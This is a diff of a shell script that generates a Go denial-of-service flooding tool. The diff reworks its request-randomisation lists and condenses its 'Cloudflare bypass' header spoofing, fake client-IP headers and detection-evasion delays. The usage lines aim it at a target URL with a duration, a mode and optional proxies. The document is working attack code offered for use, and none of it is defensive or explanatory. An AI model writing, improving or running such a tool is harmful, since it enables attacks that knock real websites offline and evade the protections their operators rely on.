@@ -23,7 +23,7 @@ echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file directly (FIXED version)
+# Create main.go file directly (CLEAN FIXED VERSION)
 echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"
 
 cat > main.go << 'EOF'
@@ -62,10 +62,6 @@ var (
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
 		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7604.56 Safari/537.36 Edg/146.0.7604.56",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6; rv:137.0) Gecko/20100101 Firefox/137.0",
-		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7604.56 Safari/537.36",
 	}
 
 	referers = []string{
@@ -75,12 +71,6 @@ var (
 		"https://facebook.com/",
 		"https://www.reddit.com/",
 		"https://www.youtube.com/",
-		"https://www.tiktok.com/",
-		"https://twitter.com/",
-		"https://www.instagram.com/",
-		"https://www.linkedin.com/",
-		"https://github.com/",
-		"https://stackoverflow.com/",
 		"",
 	}
 
@@ -89,88 +79,38 @@ var (
 		"en-GB,en;q=0.8",
 		"fr-FR,fr;q=0.9,en;q=0.8",
 		"de-DE,de;q=0.9,en;q=0.8",
-		"es-ES,es;q=0.9,en;q=0.8",
-		"it-IT,it;q=0.9,en;q=0.8",
-		"pt-BR,pt;q=0.9,en;q=0.8",
-		"ru-RU,ru;q=0.9,en;q=0.8",
-		"ja-JP,ja;q=0.9,en;q=0.8",
-		"zh-CN,zh;q=0.9,en;q=0.8",
 	}
 
 	acceptHeaders = []string{
 		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
 		"application/json, text/plain, */*",
 		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-		"*/*",
 	}
 
 	acceptEncodings = []string{
 		"gzip, deflate, br",
 		"gzip, deflate",
-		"identity",
 	}
 
 	cacheControls = []string{
 		"no-cache",
 		"no-store",
 		"must-revalidate",
-		"max-age=0",
 	}
 
-	// Enhanced Cloudflare bypass headers
-	cloudflareHeaders = []map[string]string{
-		{"CF-Connecting-IP": ""},
-		{"CF-IPCountry": ""},
-		{"CF-Ray": ""},
-		{"CF-Visitor": `{"scheme":"https"}`},
-		{"CF-Worker": "true"},
-		{"CDN-Loop": "cloudflare"},
-		{"X-Forwarded-For": ""},
-		{"X-Forwarded-Proto": "https"},
-		{"X-Forwarded-Host": ""},
-		{"X-Real-IP": ""},
-		{"True-Client-IP": ""},
-		{"X-Originating-IP": ""},
-		{"X-Remote-IP": ""},
-		{"X-Remote-Addr": ""},
-	}
-
-	securityHeaders = []map[string]string{
-		{"X-Content-Type-Options": "nosniff"},
-		{"X-Frame-Options": "DENY"},
-		{"X-XSS-Protection": "1; mode=block"},
-		{"Strict-Transport-Security": "max-age=31536000; includeSubDomains"},
-		{"Content-Security-Policy": "default-src 'self'"},
-	}
-
-	modernHeaders = []map[string]string{
-		{"Sec-Fetch-Dest": "document"},
-		{"Sec-Fetch-Mode": "navigate"},
-		{"Sec-Fetch-Site": "none"},
-		{"Sec-Fetch-User": "?1"},
-		{"Upgrade-Insecure-Requests": "1"},
-		{"DNT": "1"},
-		{"Sec-GPC": "1"},
-	}
-
-	appHeaders = []map[string]string{
-		{"X-Requested-With": "XMLHttpRequest"},
-		{"X-CSRF-Token": ""},
-		{"X-API-Key": ""},
-		{"Authorization": ""},
-		{"X-Session-Token": ""},
-	}
-
-	// Additional spoofing headers
-	spoofingHeaders = []map[string]string{
-		{"X-Client-IP": ""},
-		{"X-Host": ""},
-		{"X-Proxy-IP": ""},
-		{"X-Original-URL": ""},
-		{"X-Rewrite-URL": ""},
-		{"X-Orig-Host": ""},
-		{"X-Forwarded-Server": ""},
-		{"X-Proxy-Host": ""},
+	// Cloudflare bypass headers
+	cloudflareBypassHeaders = []string{
+		"CF-Connecting-IP",
+		"CF-IPCountry",
+		"CF-Ray",
+		"CF-Visitor",
+		"CDN-Loop",
+		"X-Forwarded-For",
+		"X-Forwarded-Proto",
+		"X-Real-IP",
+		"True-Client-IP",
+		"X-Originating-IP",
+		"X-Remote-IP",
 	}
 
 	proxies         []string
@@ -202,8 +142,6 @@ var ja3Signatures = []JA3Signature{
 			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
 			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
 			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
 		},
 		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
 		NextProtos:       []string{"h2", "http/1.1"},
@@ -220,8 +158,6 @@ var ja3Signatures = []JA3Signature{
 			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
 			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
 			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 		},
 		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
 		NextProtos:       []string{"h2", "http/1.1"},
@@ -393,38 +329,8 @@ func printBanner() {
 	fmt.Println("\033[0m")
 }
 
-// Enhanced IP spoofing functions
 func randomIP() string {
-	// Generate more realistic IPs (avoid reserved ranges)
-	for {
-		ip := fmt.Sprintf("%d.%d.%d.%d", 
-			randInt(1, 255), 
-			randInt(1, 255), 
-			randInt(1, 255), 
-			randInt(1, 255))
-		
-		// Skip reserved IP ranges
-		if strings.HasPrefix(ip, "10.") || 
-		   strings.HasPrefix(ip, "127.") || 
-		   strings.HasPrefix(ip, "169.254.") ||
-		   strings.HasPrefix(ip, "172.16.") ||
-		   strings.HasPrefix(ip, "192.168.") ||
-		   strings.HasPrefix(ip, "224.") ||
-		   strings.HasPrefix(ip, "240.") {
-			continue
-		}
-		return ip
-	}
-}
-
-func randomIPv6() string {
-	ipv6 := make([]byte, 16)
-	rand.Read(ipv6)
-	return net.IP(ipv6).String()
-}
-
-func randomCIDR() string {
-	return fmt.Sprintf("%s/%d", randomIP(), randInt(8, 30))
+	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
 }
 
 func randomUA() string {
@@ -445,10 +351,6 @@ func randomString(n int) string {
 	return string(b)
 }
 
-func randomBase64(n int) string {
-	return base64.StdEncoding.EncodeToString([]byte(randomString(n)))
-}
-
 func randInt(min, max int) int {
 	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
 	return min + int(n.Int64())
@@ -464,8 +366,6 @@ func generateCacheBust() string {
 		"?v=" + strconv.Itoa(randInt(1, 1000000)),
 		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
 		"?rnd=" + randomString(16),
-		"?cache=" + randomBase64(8),
-		"?timestamp=" + strconv.FormatInt(time.Now().UnixMilli(), 10),
 	}
 	return styles[randInt(0, len(styles)-1)]
 }
@@ -474,8 +374,7 @@ func generatePath() string {
 	paths := []string{
 		"/", "/index.html", "/home", "/main", "/default", "/welcome",
 		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
-		"/wp-admin", "/admin", "/login", "/dashboard", "/search", "/products",
-		"/categories", "/checkout", "/cart", "/profile", "/settings",
+		"/wp-admin", "/admin", "/login", "/dashboard",
 	}
 	return paths[randInt(0, len(paths)-1)]
 }
@@ -492,93 +391,29 @@ func generateCookies() string {
 	if randBool() {
 		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(16)))
 	}
-	if randBool() {
-		cookies = append(cookies, fmt.Sprintf("__cfduid=%s", randomString(32)))
-	}
-	if randBool() {
-		cookies = append(cookies, fmt.Sprintf("cf_clearance=%s", randomString(64)))
-	}
 	if len(cookies) == 0 {
 		return ""
 	}
 	return strings.Join(cookies, "; ")
 }
 
-func setCloudflareBypassHeaders(req *http.Request, target string) {
-	// Random IP for spoofing
+func addCloudflareHeaders(req *http.Request) {
 	spoofIP := randomIP()
+	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR"}
 	
-	// Set all Cloudflare bypass headers
-	cfHeaders := make(map[string]string)
-	
-	// Copy headers from templates
-	for _, headerMap := range cloudflareHeaders {
-		for k, v := range headerMap {
-			switch k {
-			case "CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP", "True-Client-IP", 
-				 "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "X-Proxy-IP":
-				cfHeaders[k] = spoofIP
-			case "CF-IPCountry":
-				countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR"}
-				cfHeaders[k] = countries[randInt(0, len(countries)-1)]
-			case "CF-Ray":
-				cfHeaders[k] = randomString(16) + "-" + strings.ToUpper(randomString(4))
-			case "X-Forwarded-Host", "X-Host", "X-Orig-Host", "X-Forwarded-Server":
-				u, _ := url.Parse(target)
-				cfHeaders[k] = u.Hostname()
-			case "X-Forwarded-Proto":
-				if strings.HasPrefix(target, "https") {
-					cfHeaders[k] = "https"
-				} else {
-					cfHeaders[k] = "http"
-				}
-			default:
-				if v == "" {
-					cfHeaders[k] = randomString(randInt(8, 32))
-				} else {
-					cfHeaders[k] = v
-				}
-			}
-		}
-	}
-	
-	// Apply all headers
-	for k, v := range cfHeaders {
-		req.Header.Set(k, v)
-	}
-	
-	// Add CDN-specific headers
+	req.Header.Set("CF-Connecting-IP", spoofIP)
+	req.Header.Set("CF-IPCountry", countries[randInt(0, len(countries)-1)])
+	req.Header.Set("CF-Ray", randomString(16)+"-"+strings.ToUpper(randomString(4)))
+	req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
 	req.Header.Set("CDN-Loop", "cloudflare")
-	req.Header.Set("CF-Worker", "true")
-	
-	// Add X-Forwarded-For chain (multiple IPs)
-	if randBool() {
-		chain := fmt.Sprintf("%s, %s, %s", randomIP(), randomIP(), spoofIP)
-		req.Header.Set("X-Forwarded-For", chain)
-	}
-}
-
-func setSpoofingHeaders(req *http.Request, target string) {
-	spoofIP := randomIP()
-	
-	for _, headerMap := range spoofingHeaders {
-		for k, v := range headerMap {
-			if v == "" {
-				if strings.Contains(strings.ToLower(k), "ip") || strings.Contains(strings.ToLower(k), "host") {
-					if strings.Contains(strings.ToLower(k), "host") {
-						u, _ := url.Parse(target)
-						req.Header.Set(k, u.Hostname())
-					} else {
-						req.Header.Set(k, spoofIP)
-					}
-				} else {
-					req.Header.Set(k, randomString(randInt(8, 32)))
-				}
-			} else {
-				req.Header.Set(k, v)
-			}
-		}
-	}
+	req.Header.Set("X-Forwarded-For", spoofIP)
+	req.Header.Set("X-Forwarded-Proto", "https")
+	req.Header.Set("X-Real-IP", spoofIP)
+	req.Header.Set("True-Client-IP", spoofIP)
+	req.Header.Set("X-Originating-IP", spoofIP)
+	req.Header.Set("X-Remote-IP", spoofIP)
+	req.Header.Set("X-Remote-Addr", spoofIP)
+	req.Header.Set("X-Client-IP", spoofIP)
 }
 
 func main() {
@@ -640,8 +475,7 @@ func main() {
 	if useProxy && len(proxies) > 0 {
 		fmt.Printf("[+] Proxies: %d\n", len(proxies))
 	}
-	fmt.Println("[+] Enhanced Cloudflare bypass enabled")
-	fmt.Println("[+] Advanced IP spoofing enabled")
+	fmt.Println("[+] Cloudflare bypass headers enabled")
 	fmt.Println("[+] Starting... Press Ctrl+C to stop")
 
 	poolSize := 500
@@ -778,57 +612,28 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
 			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
 			req.Header.Set("Connection", "keep-alive")
-
-			// Set Cloudflare bypass headers
-			setCloudflareBypassHeaders(req, target)
+			req.Header.Set("Upgrade-Insecure-Requests", "1")
+			req.Header.Set("DNT", "1")
 			
-			// Set additional spoofing headers
-			setSpoofingHeaders(req, target)
+			// Add Cloudflare bypass headers
+			addCloudflareHeaders(req)
 
-			// Set security headers
-			numSecurity := randInt(1, 3)
-			for i := 0; i < numSecurity; i++ {
-				secHeader := securityHeaders[randInt(0, len(securityHeaders)-1)]
-				for k, v := range secHeader {
-					req.Header.Set(k, v)
-				}
-			}
+			// Add random spoofed IP headers
+			randomSpoofIP := randomIP()
+			req.Header.Set("X-Forwarded-For", randomSpoofIP)
+			req.Header.Set("X-Real-IP", randomSpoofIP)
 
-			// Set modern headers
-			numModern := randInt(2, 5)
-			for i := 0; i < numModern; i++ {
-				modernHeader := modernHeaders[randInt(0, len(modernHeaders)-1)]
-				for k, v := range modernHeader {
-					req.Header.Set(k, v)
-				}
-			}
-
-			// Set app headers
-			if randInt(1, 100) <= 60 {
-				numApp := randInt(1, 3)
-				for i := 0; i < numApp; i++ {
-					appHeader := appHeaders[randInt(0, len(appHeaders)-1)]
-					for k, v := range appHeader {
-						if v == "" {
-							req.Header.Set(k, randomString(32))
-						} else {
-							req.Header.Set(k, v)
-						}
-					}
-				}
-			}
-
-			// Set cookies
-			if randInt(1, 100) <= 60 {
+			// Add cookies
+			if randInt(1, 100) <= 50 {
 				cookies := generateCookies()
 				if cookies != "" {
 					req.Header.Set("Cookie", cookies)
 				}
 			}
 
-			// Add random delay to avoid pattern detection
-			if randInt(1, 100) <= 10 {
-				time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
+			// Add random delay to avoid detection
+			if randInt(1, 100) <= 5 {
+				time.Sleep(time.Duration(randInt(1, 3)) * time.Millisecond)
 			}
 
 			resp, err := client.Do(req)
@@ -960,13 +765,12 @@ if [ $? -eq 0 ]; then
     echo -e "   ${YELLOW}./main https://target.com 60 SLOW${NC}"
     echo -e "   ${YELLOW}./main https://target.com 60 GET proxy${NC}"
     echo
-    echo -e " ${GREEN}Features added:${NC}"
-    echo -e "   • Enhanced Cloudflare bypass headers"
-    echo -e "   • Advanced IP spoofing (IPv4 + IPv6)"
-    echo -e "   • X-Forwarded-For chaining"
-    echo -e "   • Random request delays"
+    echo -e " ${GREEN}Features:${NC}"
+    echo -e "   • Cloudflare bypass headers"
+    echo -e "   • IP spoofing with X-Forwarded-For"
+    echo -e "   • Random delays to avoid detection"
     echo -e "   • Extended cookie generation"
-    echo -e "   • More user agents and referers"
+    echo -e "   • Multiple user agents and referers"
     echo
     exit 0
 else
